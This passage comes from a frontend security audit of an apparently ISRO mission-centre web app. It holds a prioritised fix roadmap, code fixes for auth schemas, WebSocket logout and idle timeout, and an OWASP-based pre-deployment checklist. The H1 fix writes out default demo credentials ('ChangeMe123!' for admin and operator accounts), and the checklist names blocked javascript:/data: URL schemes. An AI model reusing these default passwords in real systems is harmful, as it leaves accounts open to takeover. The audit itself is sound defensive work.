#### 🟠 J1 — `react-quill` or `dompurify` Version Not Pinned Strictly
**File:** `package.json`

**Current state:** `dompurify` is used via Vite's bundling (exact version unknown from this audit). If `package.json` uses a `^` range for `dompurify`, a compromised patch release could introduce an XSS bypass — `dompurify` is the primary XSS defense.

**Fix:** Pin `dompurify` to an exact version:
```json
"dompurify": "3.1.6"  // not "^3.1.6"
```
Set up Dependabot or Renovate with manual approval required for `dompurify` updates specifically.

---

#### 🟡 J2 — No `npm audit` Check Before Build/Deploy
**Current state:** No documented pre-build audit step.

**Fix:** Add to CI/CD pipeline:
```bash
npm audit --audit-level=high
npm run build  # only if audit passes
```

---

## 3. Prioritized Fix Roadmap

### Phase 1 — Critical (Fix Before Next Production Deployment)
| ID | Issue | File | Effort |
| :--- | :--- | :--- | :--- |
| H1 | Demo credentials in production bundle | `Login.tsx` | 5 min |
| A1 | Access token in WebSocket query string | `ws.ts` | 4 hrs |
| B1 | CMS blocks rendered without sanitization check | All pages using CMS | 2 hrs |
| D1 | No client-side file type restriction | `useFileUpload.ts` | 2 hrs |

### Phase 2 — High (Fix Within This Sprint)
| ID | Issue | File | Effort |
| :--- | :--- | :--- | :--- |
| A3 | Logout does not disconnect WebSocket | Auth logout handler | 15 min |
| C1 | Register schema: 8-char password min (should be 10) | `authSchemas.ts` | 5 min |
| C2 | Register schema: allows non-ISRO email domains | `authSchemas.ts` | 30 min |
| B3 | External CMS image URLs not validated via `isSafeUrl` | CMS render components | 1 hr |
| G1 | `ProtectedRoute` renders without checking `isChecking` | `App.tsx` | 30 min |
| F1 | No Axios timeout configured | `client.ts` | 5 min |
| E1 | WS reconnect does not refresh token first | `ws.ts` | 2 hrs |

### Phase 3 — Medium (Fix Within 1 Month)
| ID | Issue | File | Effort |
| :--- | :--- | :--- | :--- |
| D2 | SHA-256 not verified against server response | `useFileUpload.ts` | 1 hr |
| D3 | No client-side file size limit | `useFileUpload.ts` | 30 min |
| C3-C5 | Missing max-lengths + phone format validation | `authSchemas.ts` | 1 hr |
| F3 | Raw server error messages shown in UI | `Login.tsx`, `Register.tsx` | 2 hrs |
| B4 | CSV formula injection protection | `exportCsv.ts` | 30 min |
| E2 | WS message type not validated against allowlist | `ws.ts` | 30 min |
| H2 | `hddPath` exposed in search results | API response / components | 1 hr |
| I1 | Production env vars not set explicitly | `vite.config.ts` / CI | 1 hr |

### Phase 4 — Low / Improvement (Next Quarter)
| ID | Issue | Effort |
| :--- | :--- | :--- |
| G3 | Idle session timeout (30 min for mission centre) | 3 hrs |
| A2 | Access token in JS heap — add CSP via backend helmet | (backend work) |
| G2 | Auto-logout on 403 (role revoked mid-session) | 1 hr |
| H3 | Drop console in production build (`terserOptions`) | 15 min |
| J1 | Pin `dompurify` to exact version | 5 min |
| D4 | Abort chunked upload on error + cleanup | 2 hrs |

---

## 4. Code Implementation Guide for Each Fix

### Fix H1 — Remove Demo Credentials From Production Bundle
```ts
// src/pages/Login.tsx — wrap the entire DEMO_ACCOUNTS block:
const DEMO_ACCOUNTS = import.meta.env.DEV
  ? [
      { role: 'Super Admin', email: 'admin@istrac.local', pass: 'ChangeMe123!', badge: 'bg-accent/15 text-accent-light border-accent/30' },
      { role: 'Flight User', email: 'operator@istrac.local', pass: 'ChangeMe123!', badge: 'bg-nominal/15 text-nominal border-nominal/30' },
      { role: 'FDD Lead', email: 'fddlead@istrac.local', pass: 'ChangeMe123!', badge: 'bg-purple-400/15 text-purple-400 border-purple-400/30' },
    ]
  : []

// The JSX section rendering DEMO_ACCOUNTS:
{import.meta.env.DEV && DEMO_ACCOUNTS.length > 0 && (
  <div className="...">
    {/* Quick fill buttons */}
  </div>
)}
```

### Fix C1 + C2 — Align Auth Schemas (Complete)
```ts
// frontend/schemas/authSchemas.ts
import { z } from 'zod'

const ALLOWED_DOMAINS = (import.meta.env.VITE_ALLOWED_EMAIL_DOMAINS || 'isro.gov.in,istrac.gov.in,dos.gov.in')
  .split(',').map((d: string) => d.trim())

const passwordRules = z.string()
  .min(10, 'Password must be at least 10 characters')
  .max(128, 'Password must not exceed 128 characters')
  .regex(/[A-Z]/, 'Must contain at least one uppercase letter')
  .regex(/[0-9]/, 'Must contain at least one number')
  .regex(/[^A-Za-z0-9]/, 'Must contain at least one special character')

export const loginSchema = z.object({
  email: z.string().email('Enter a valid email address').toLowerCase().trim(),
  password: passwordRules,
})

export const registerSchema = z.object({
  name: z.string().min(2, 'Full name required').max(100),
  designation: z.string().min(2, 'Designation required').max(100),
  email: z.string()
    .email('Enter a valid email address')
    .refine(v => ALLOWED_DOMAINS.some((d: string) => v.toLowerCase().endsWith(`@${d}`)),
      `Only official ISRO email addresses are permitted (e.g. name@isro.gov.in)`),
  employeeId: z.string().min(1, 'Employee ID required').max(30),
  phone: z.string().regex(/^\+?[\d\s\-()+]{7,20}$/, 'Enter a valid contact number'),
  departmentPreference: z.string().min(1, 'Select a department'),
  password: passwordRules,
  confirmPassword: z.string(),
  reasonForAccess: z.string().max(1000).optional(),
})
.refine(d => d.password === d.confirmPassword, {
  message: 'Passwords do not match',
  path: ['confirmPassword'],
})
```

### Fix A3 — Disconnect WS on Logout (Simple)
Find the logout mutation/handler. Add one line:
```ts
// Wherever authApi.logout() is called:
await authApi.logout()
wsClient.disconnect()       // ← ADD THIS
useAuthStore.getState().clearAuth()
navigate('/login')
```

### Fix G3 — Idle Session Timeout
```ts
// src/hooks/useIdleTimeout.ts
import { useEffect } from 'react'
import { wsClient } from '../lib/ws'
import { useAuthStore } from '../store/authStore'

export function useIdleTimeout(timeoutMs = 30 * 60 * 1000) {
  useEffect(() => {
    let timer: ReturnType<typeof setTimeout>
    
    function resetTimer() {
      clearTimeout(timer)
      timer = setTimeout(() => {
        useAuthStore.getState().clearAuth()
        wsClient.disconnect()
        window.location.replace('/login?reason=idle')
      }, timeoutMs)
    }
    
    const events = ['mousedown', 'keydown', 'touchstart', 'scroll', 'mousemove'] as const
    events.forEach(e => window.addEventListener(e, resetTimer, { passive: true }))
    resetTimer()
    
    return () => {
      clearTimeout(timer)
      events.forEach(e => window.removeEventListener(e, resetTimer))
    }
  }, [timeoutMs])
}

// src/App.tsx inside the <ProtectedRoute> layout:
function AppLayout() {
  useIdleTimeout(30 * 60 * 1000) // 30 minutes — appropriate for mission-critical environment
  return <Outlet />
}
```

---

## 5. Frontend Security Standards Checklist

Use this as a pre-deployment gate. Each item must be verified before pushing to production.

### Token & Session (OWASP ASVS V3)
- [ ] Access token stored in memory only (not localStorage/sessionStorage) ✅
- [ ] Refresh token in httpOnly SameSite Strict cookie ✅
- [ ] WebSocket uses ticket/header for auth — NOT query string ❌ (A1)
- [ ] Logout disconnects WebSocket ❌ (A3)
- [ ] `clearAuth()` called on 401 refresh failure ✅
- [ ] Idle session timeout implemented ❌ (G3)
- [ ] Demo credentials not compiled into production bundle ❌ (H1)

### XSS Prevention (OWASP ASVS V5 / A03)
- [ ] `dangerouslySetInnerHTML` always wraps `sanitizeHtml()` — audit all usages ❌ (B1)
- [ ] CMS block string values sanitized before render ❌ (B1)
- [ ] External image URLs validated via `isSafeUrl()` ❌ (B3)
- [ ] Notification messages rendered as JSX text (not HTML) ⚠️ (B2 — verify)
- [ ] `javascript:` / `data:` URL schemes blocked ✅
- [ ] `console.log` dropped from production builds ❌ (H3)

### Input Validation (OWASP ASVS V5)
- [ ] Auth forms use Zod schema validation ✅
- [ ] Password minimum 10 chars + complexity rules in both login & register schemas ⚠️ (C1 — register has 8)
- [ ] Email domain restricted to ISRO gov domains ❌ (C2)
- [ ] File type restriction on upload ❌ (D1)
- [ ] File size limit enforced client-side ❌ (D3)
- [ ] Max-lengths on all text inputs ❌ (C4)

### File Upload (OWASP ASVS V12)
- [ ] Client-side extension allowlist ❌ (D1)
- [ ] File size limit enforced ❌ (D3)
- [ ] SHA-256 integrity verified against server response ❌ (D2)
- [ ] Chunked upload cleanup on failure ❌ (D4)

### API Security (OWASP ASVS V1)
- [ ] Axios request timeout set ❌ (F2)
- [ ] VITE_API_URL required for production builds ❌ (F1)
- [ ] Server error codes mapped to safe UI messages ❌ (F3)
- [ ] WS message types validated against allowlist ❌ (E2)
- [ ] WS reconnect refreshes token first ❌ (E1)

### Access Control (OWASP ASVS V4)
- [ ] `ProtectedRoute` checks `isChecking` before rendering ❌ (G1)
- [ ] Admin API 403 triggers client-side logout ❌ (G2)
- [ ] All admin mutations confirmed server-side (never trust client role) ✅

### Build & Supply Chain
- [ ] `npm audit --audit-level=high` in CI ❌ (J2)
- [ ] `dompurify` pinned to exact version ❌ (J1)
- [ ] `drop_console: true` in terser config ❌ (H3)
- [ ] External CDN scripts use SRI hashes ✅ (no CDN scripts currently)
- [ ] `VITE_API_URL` and `VITE_WS_URL` set explicitly for production ❌ (I1)
